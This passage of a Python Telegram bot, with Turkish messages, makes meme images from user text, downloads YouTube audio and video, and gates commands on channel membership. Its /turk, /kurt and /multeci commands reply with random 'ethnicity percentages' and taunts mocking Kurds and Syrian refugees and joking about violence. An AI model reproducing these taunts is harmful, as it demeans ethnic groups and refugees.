        image = Image.open("c.png").convert('RGBA')

        # Load the font
        font_url = "https://fonts.gstatic.com/s/indieflower/v21/m8JVjfNVeKWVnh3QMuKkFcZlbg.ttf"
        font_response = requests.get(font_url)
        font_response.raise_for_status()
        font = ImageFont.truetype(BytesIO(font_response.content), size=55)

        # Create a new image for the text
        text_image = Image.new('RGBA', (image.width, image.height), (255, 255, 255, 0))
        draw = ImageDraw.Draw(text_image)

        # Define the text and shadow position
        position = (300, 460)
        shadow_position = (position[0] + 1, position[1] + 1)

        # Draw the shadow
        draw.text(shadow_position, text, (0, 0, 0), font=font, spacing=20, align="center")

        # Draw the main text with the new color
        draw.text(position, text, (50, 50, 50), font=font, spacing=20, align="center")

        # Rotate the text image by 10 degrees to the left
        rotated_text_image = text_image.rotate(-13,resample=Image.BICUBIC, expand=1)

        # Create a new image to hold the combined result
        combined_image = Image.new('RGBA', image.size, (160, 100, 50))
        combined_image.paste(image, (0, 0))

        # Calculate the position to paste the rotated text image to center it correctly
        paste_position = (
            (image.width - rotated_text_image.width) // 2,
            (image.height - rotated_text_image.height) // 2
        )

        # Paste the rotated text image onto the combined image
        combined_image.paste(rotated_text_image, paste_position, rotated_text_image)

        # Apply Gaussian blur
        blurred_image = combined_image.filter(ImageFilter.GaussianBlur(radius=1.5))

        # Convert to RGB and save to buffer
        buffered = BytesIO()
        blurred_image.convert('RGB').save(buffered, format="JPEG")
        buffered.seek(0)
        bot.send_photo(message.chat.id, photo=buffered)

    except requests.exceptions.HTTPError as err:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir HTTP hatası oluştu. Hata: ")

    except Exception as e:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir hata oluştu. Hata: ")
        



@bot.message_handler(commands=['meme2'])
def add_text_to_image(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    text = message.text.replace('/meme2 ', '')

    try:
        image = Image.open("d.png").convert('RGBA')

        # Load the font
        font_url = "https://fonts.gstatic.com/s/indieflower/v21/m8JVjfNVeKWVnh3QMuKkFcZlbg.ttf"
        font_response = requests.get(font_url)
        font_response.raise_for_status()
        font = ImageFont.truetype(BytesIO(font_response.content), size=46)

        # Create a new image for the text
        text_image = Image.new('RGBA', (image.width, image.height), (255, 255, 255, 0))
        draw = ImageDraw.Draw(text_image)

        # Define the text and shadow position
        position = (340, 820)
        shadow_position = (position[0] + 1, position[1] + 1)

        # Draw the shadow
        draw.text(shadow_position, text, (0, 0, 0), font=font, spacing=100, align="center")

        # Draw the main text with the new color
        draw.text(position, text, (50, 50, 50), font=font, spacing=100, align="center")

        # Rotate the text image by 10 degrees to the left
        rotated_text_image = text_image.rotate(-7,resample=Image.BICUBIC, expand=1)

        # Create a new image to hold the combined result
        combined_image = Image.new('RGBA', image.size, (160, 100, 50))
        combined_image.paste(image, (0, 0))

        # Calculate the position to paste the rotated text image to center it correctly
        paste_position = (
            (image.width - rotated_text_image.width) // 2,
            (image.height - rotated_text_image.height) // 2
        )

        # Paste the rotated text image onto the combined image
        combined_image.paste(rotated_text_image, paste_position, rotated_text_image)

        # Apply Gaussian blur
        blurred_image = combined_image.filter(ImageFilter.GaussianBlur(radius=1.1))

        # Convert to RGB and save to buffer
        buffered = BytesIO()
        blurred_image.convert('RGB').save(buffered, format="JPEG")
        buffered.seek(0)
        bot.send_photo(message.chat.id, photo=buffered)

    except requests.exceptions.HTTPError as err:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir HTTP hatası oluştu. Hata: ")

    except Exception as e:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir hata oluştu. Hata: ")





@bot.message_handler(commands=['got'])
def add_text_to_image(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    # is_user_member fonksiyonunu tanımlayın ve kullanıcının üyelik durumunu kontrol edin
    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return
    
    text = message.text.replace('/got ', '')  

    try:
        # Local /storage/emulated/0/b.png dosyasından resmi yükle
        image = Image.open("b.png")

        draw = ImageDraw.Draw(image)

        position = (490, 480)  

        font_url = "https://fonts.gstatic.com/s/indieflower/v21/m8JVjfNVeKWVnh3QMuKkFcZlbg.ttf"
        font_response = requests.get(font_url)
        font_response.raise_for_status()  # Font indirme hatası için kontrol ekliyoruz
        font = ImageFont.truetype(BytesIO(font_response.content), size=50)  

        draw.text(position, text, (160, 100, 50), font=font, spacing=10, align="center")  

        shadow_position = (position[0] + 1, position[1] + 1)  
        draw.text(shadow_position, text, (0, 0, 0), font=font, spacing=10, align="center")  
        
        blurred_image = image.filter(ImageFilter.GaussianBlur(radius=1.6))

        # Buffer kullanmadan doğrudan resmi göndermek mümkün değil, dolayısıyla resmi kaydedip gönderiyoruz
        buffered = BytesIO()
        blurred_image.save(buffered, format="JPEG")  # JPEG formatında kaydediyoruz, çünkü Telegram JPEG formatını daha iyi destekliyor
        buffered.seek(0)
        bot.send_photo(message.chat.id, photo=buffered)

    except requests.exceptions.HTTPError as err:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir HTTP hatası oluştu. Hata: {err}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir hata oluştu. Hata: {e}")


# /türk komutuna yanıt ver
@bot.message_handler(commands=['turk'])
def send_random_percent(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    # Rastgele bir oran üret
    random_percent = random.uniform(1, 100)
    if random_percent <= 50:
        response = f'%{random_percent:.2f} Türk\'sün! Hewal, Gel dağa kaçak!'
    else:
        response = f'%{random_percent:.2f} Türk\'sün! Babayiğit, Gel PKK avına çıkalım!'
    bot.reply_to(message, response)

# /kürt komutuna yanıt ver
@bot.message_handler(commands=['kurt'])
def send_random_percent_kurt(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    # Rastgele bir oran üret
    random_percent = random.uniform(1, 100)
    if random_percent <= 50:
        response = f'%{random_percent:.2f} Kürt\'sün! Babayiğit, Ülken var!'
    else:
        response = f'%{random_percent:.2f} Kürt\'sün! Hewal, Bomba Geldi Kaç!'
    bot.reply_to(message, response)

# /mülteci komutuna yanıt ver
@bot.message_handler(commands=['multeci'])
def send_random_percent_multeci(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    # Rastgele bir oran üret
    random_percent = random.uniform(1, 100)
    if random_percent <= 50:
        response = f'%{random_percent:.2f} Mülteci\'sin! Babayiğit, Helal lan!'
    else:
        response = f'%{random_percent:.2f} Mülteci\'sin! Abi, Esat Bize bum bum!'
    bot.reply_to(message, response)





import os
from youtube_search import YoutubeSearch
from pytube import YouTube
import telebot


def is_user_member(user_id, chat_id):
    try:
        member = bot.get_chat_member(chat_id, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception:
        return False

@bot.message_handler(commands=['muzik'])
def download_music(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    query = " ".join(message.text.split()[1:])
    if not query:
        bot.reply_to(message, "Lütfen müzik adı veya YouTube linki girin. Örnek kullanım: /muzik şarkı adı")
        return

    try:
        results = YoutubeSearch(query, max_results=1).to_dict()
    except Exception as e:
        bot.reply_to(message, f"Arama sırasında hata oluştu: {e}")
        return

    if results and len(results) > 0:
        video_url = 'https://www.youtube.com' + results[0]['url_suffix']
        bot.reply_to(message, f"Müzik indiriliyor: {video_url}")

        try:
            yt = YouTube(video_url)
            if yt.age_restricted:
                bot.reply_to(message, "Bu video yaş sınırlamalı ve indirilemiyor. Lütfen başka bir video seçin.")
                return

            audio_stream = yt.streams.filter(only_audio=True).first()
            if audio_stream:
                audio_path = audio_stream.download(output_path=".", filename=yt.title + ".mp3")

                with open(audio_path, 'rb') as audio:
                    bot.send_audio(message.chat.id, audio, caption=f"{yt.title}\n@TSGChecker")

                os.remove(audio_path)
            else:
                bot.reply_to(message, "Uygun bir ses akışı bulunamadı.")
        except Exception as e:
            bot.reply_to(message, f"Müzik indirilemedi. Hata: {e}")
    else:
        bot.reply_to(message, "Müzik bulunamadı veya YouTube arama sonucu boş.")

@bot.message_handler(commands=['video'])
def download_video(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    query = " ".join(message.text.split()[1:])
    if not query:
        bot.reply_to(message, "Lütfen video adı veya YouTube linki girin. Örnek kullanım: /video video adı")
        return

    try:
        results = YoutubeSearch(query, max_results=1).to_dict()
    except Exception as e:
        bot.reply_to(message, f"Arama sırasında hata oluştu: {e}")
        return

    if results and len(results) > 0:
        video_url = 'https://www.youtube.com' + results[0]['url_suffix']
        bot.reply_to(message, f"Video indiriliyor: {video_url}")

        try:
            yt = YouTube(video_url)
            if yt.age_restricted:
                bot.reply_to(message, "Bu video yaş sınırlamalı ve indirilemiyor. Lütfen başka bir video seçin.")
                return

            video_stream = yt.streams.filter(progressive=True, file_extension='mp4').first()
            if video_stream:
                video_path = video_stream.download(output_path=".", filename=yt.title + ".mp4")

                with open(video_path, 'rb') as video:
                    bot.send_video(message.chat.id, video, caption=f"{yt.title}\n@TSGChecker", supports_streaming=True)

                os.remove(video_path)
            else:
                bot.reply_to(message, "Uygun bir video akışı bulunamadı.")
        except Exception as e:
            bot.reply_to(message, f"Video indirilemedi. Hata: {e}")
    else:
        bot.reply_to(message, "Video bulunamadı veya YouTube arama sonucu boş.")

# Botun çalışması için komutlar



@bot.message_handler(commands=['cm'])
def send_random_number(message):
    random_number = random.randint(1, 40)
    bot.reply_to(message, f"ÇAVUŞUN BOYU: {random_number} cm")


while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Hata: {e} ")
